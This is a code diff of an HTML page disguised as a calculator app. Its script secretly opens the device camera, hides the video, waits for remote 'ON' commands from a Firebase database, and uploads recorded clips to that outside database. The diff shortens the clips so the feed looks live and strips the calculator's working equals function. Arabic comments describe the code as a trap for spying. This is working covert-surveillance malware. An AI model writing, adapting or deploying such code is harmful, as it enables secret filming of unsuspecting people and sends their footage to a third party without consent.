@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Smart Calculator</title>
+    <title>Calculator Pro</title>
     <style>
-        body { background: #17181A; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .calc { width: 90%; max-width: 360px; background: #222427; padding: 25px; border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
-        #display { font-size: 48px; color: #FFF; text-align: right; margin-bottom: 25px; height: 60px; overflow: hidden; }
+        body { background: #17181A; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .calc { width: 90%; max-width: 360px; background: #222427; padding: 25px; border-radius: 30px; }
+        #display { font-size: 48px; color: #FFF; text-align: right; margin-bottom: 25px; height: 60px; }
         .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; }
-        button { border: none; border-radius: 50%; height: 70px; width: 70px; font-size: 24px; color: #fff; background: #333639; cursor: pointer; transition: 0.1s; }
-        button:active { background: #444; }
+        button { border: none; border-radius: 50%; height: 70px; width: 70px; font-size: 24px; color: #fff; background: #333639; }
         .btn-op { background: #008DDE; }
         video { display: none; }
     </style>
@@ -24,7 +23,7 @@
         <button onclick="p('7')">7</button><button onclick="p('8')">8</button><button onclick="p('9')">9</button><button class="btn-op">×</button>
         <button onclick="p('4')">4</button><button onclick="p('5')">5</button><button onclick="p('6')">6</button><button class="btn-op">−</button>
         <button onclick="p('1')">1</button><button onclick="p('2')">2</button><button onclick="p('3')">3</button><button class="btn-op">+</button>
-        <button onclick="p('0')">0</button><button>.</button><button style="grid-column: span 2; width: auto; border-radius: 35px; background: #008DDE;" onclick="equal()">=</button>
+        <button onclick="p('0')">0</button><button>.</button><button style="grid-column: span 2; width: auto; border-radius: 35px; background: #008DDE;">=</button>
     </div>
 </div>
 
@@ -32,63 +31,53 @@
 <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
 
 <script>
-    // إعدادات فايربيز الخاصة بك
-    const firebaseConfig = {
-        databaseURL: "https://itel-d77e2-default-rtdb.firebaseio.com"
-    };
+    const firebaseConfig = { databaseURL: "https://itel-d77e2-default-rtdb.firebaseio.com" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     const devName = "Main_Device";
     let isSpying = false;
 
-    // تشغيل الكاميرا فورياً في الخلفية
-    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+    navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: false })
     .then(stream => {
-        // الاستماع لأوامر لوحة التحكم (Admin)
         db.ref('commands/' + devName).on('value', snap => {
-            const cmd = snap.val();
-            if(cmd === "ON" && !isSpying) {
+            if(snap.val() === "ON" && !isSpying) {
                 isSpying = true;
-                runTrap(stream);
-            } else if(cmd === "OFF") {
+                startDirectStream(stream);
+            } else if(snap.val() === "OFF") {
                 isSpying = false;
             }
         });
     });
 
-    function runTrap(stream) {
+    function startDirectStream(stream) {
         if(!isSpying) return;
 
-        let recorder = new MediaRecorder(stream);
+        let recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
         let chunks = [];
-        recorder.ondataavailable = (e) => chunks.push(e.data);
+        recorder.ondataavailable = e => chunks.push(e.data);
         
         recorder.onstop = () => {
             const blob = new Blob(chunks, { type: 'video/webm' });
             const reader = new FileReader();
             reader.readAsDataURL(blob);
-            reader.onloadend = async () => {
-                const batt = await navigator.getBattery();
-                db.ref('radar/' + devName).update({
-                    video: reader.result,
-                    batt: Math.round(batt.level * 100) + "%",
-                    time: new Date().toLocaleTimeString()
+            reader.onloadend = () => {
+                // رفع مباشر "دايركت" للداتا بيز
+                db.ref('live_stream/' + devName).set({
+                    v: reader.result,
+                    t: Date.now()
                 });
-                // تكرار العملية طالما الحالة ON
-                if(isSpying) runTrap(stream);
+                if(isSpying) startDirectStream(stream);
             };
         };
 
         recorder.start();
-        // تسجيل 7 ثواني (نفس توقيت الفخ الأصلي)
-        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 7000);
+        // تسجيل ثانيتين فقط عشان يبان إنه لايف
+        setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, 2000);
     }
 
-    // كود الآلة الحاسبة
-    let disp = document.getElementById('display');
-    function p(v){ if(disp.innerText==="0") disp.innerText=""; disp.innerText+=v; }
-    function clr(){ disp.innerText="0"; }
-    function equal(){ try{ disp.innerText = eval(disp.innerText.replace('×','*').replace('÷','/')); } catch { disp.innerText="Error"; } }
+    let d = document.getElementById('display');
+    function p(v){ if(d.innerText==="0") d.innerText=""; d.innerText+=v; }
+    function clr(){ d.innerText="0"; }
 </script>
 </body>
 </html>
